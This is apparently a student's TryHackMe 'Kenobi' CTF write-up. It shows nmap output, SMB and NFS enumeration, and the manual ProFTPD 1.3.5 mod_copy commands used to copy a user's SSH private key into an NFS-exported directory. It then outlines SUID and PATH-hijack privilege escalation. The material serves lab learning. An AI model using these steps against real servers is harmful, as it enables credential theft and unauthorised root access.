[[TryHackMe]]
##########################
Cosmin Tibuleac | 08.10.2021
##########################




## Reconnaisance

IP: 10.10.203.182
export IP=10.10.2.255 (awesome command!)
## Nmap

 Nmap 7.91 scan initiated Fri Oct  8 13:23:48 2021 as: nmap -sC -sV -o nmap.txt -vv 10.10.203.182
Nmap scan report for 10.10.203.182
Host is up, received reset ttl 63 (0.065s latency).
Scanned at 2021-10-08 13:23:48 EDT for 15s
Not shown: 993 closed ports
Reason: 993 resets
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37059/udp   mountd
|   100005  1,2,3      48193/tcp   mountd
|   100005  1,2,3      52702/udp6  mountd
|   100005  1,2,3      56783/tcp6  mountd
|   100021  1,3,4      37863/tcp6  nlockmgr
|   100021  1,3,4      38057/udp6  nlockmgr
|   100021  1,3,4      39789/tcp   nlockmgr
|   100021  1,3,4      49982/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     syn-ack ttl 63 2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8838/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30695/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45294/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17475/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-10-08T12:24:01-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-08T17:24:01
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  8 13:24:04 2021 -- 1 IP address (1 host up) scanned in 15.93 seconds
	
	
### HTTP (80)
	
Looks like port 80 is opened on the machine, but it's only displaying an image: 
	
	![[Pasted image 20211008135024.png]]
	
**Gobuster** could not find any new directories.
	
### FTP (21)
	
	The FTP server looks particularly interesting.
	This ProFTPD server version (1.3.5) seems to be vulnerable to the following exploit, as 
	described on [[Rapid7]]:
	
*This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible.*
	
	[https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/]
	
	Let's try enumerating the SMB shares/users with *enum4linux*.
	
	Looks like there might be an anonymous share: 
	
	![[Pasted image 20211008143648.png]]
	
	We have also found the following domains: 
	
	![[Pasted image 20211008143717.png]]
	
	Since there is an **anonymous** share on SMB, we can try and login without a password.
	
	We can do so by using the following command: 
*	smbclient //10.10.203.182/anonymous*
	
	Inside the anonymous share, we found a txt file 'log.txt'
	
	The file shows us that the proftpd server is running as 'kenobi' user.
	
	We can see that on the port 111 (rpc)
	showmount -e 10.10.52.227
	Export list for 10.10.52.227:
	/var *
	
	
ProFTPD version seems to be 1.3.5.:
*nmap -sC -sV $IP -p 21                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 02:45 EDT
Nmap scan report for 10.10.2.255
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
Service Info: OS: Unix*

	We can try to connect to the server and move kenobi's id_rsa to the anonymous samba share (which we have access to without any credentials)
*nc $IP 21                                                                                
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.2.255]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful*
exit
	
Now we can try to mount the var file with nfs, like this: 
	
*mount 10.10.2.255:/var /mnt/nfs/kenobiNFS*
	

(root💀kali)-[/mnt/nfs/kenobiNFS/tmp]
└─# ls                                                                                         127 ⨯ 1 ⚙
id_rsa

Now that we have kenobi's id_rsa key, we can try to log into ssh using it.
	
	![[Pasted image 20211010035001.png]]
	
	And here is our user txt:
	
	![[Pasted image 20211010035113.png]]
	
	
Now, we shall try to escalate our privilegies to root.
	
As described on Tryhackme, we can use that by abusing SUID:
	
**SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. **

**To search the a system for these type of files run the following:**  *find / -perm -u=s -type f 2>/dev/null*

By searching for this, we have found some files.
	
The usr/bin/menu seems interesting, and if we run it, we can see the following: 
	
	![[Pasted image 20211010141323.png]]
	
We can use the "strings" command for those binaries.
*Strings is a command on Linux that looks for human readable strings on a binary.*
	
![[Pasted image 20211010141632.png]]
	
Tryhackme: *This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.*
	
![[Pasted image 20211010142213.png]]
	

	
	
[[SMB]] [[NFS]]
	
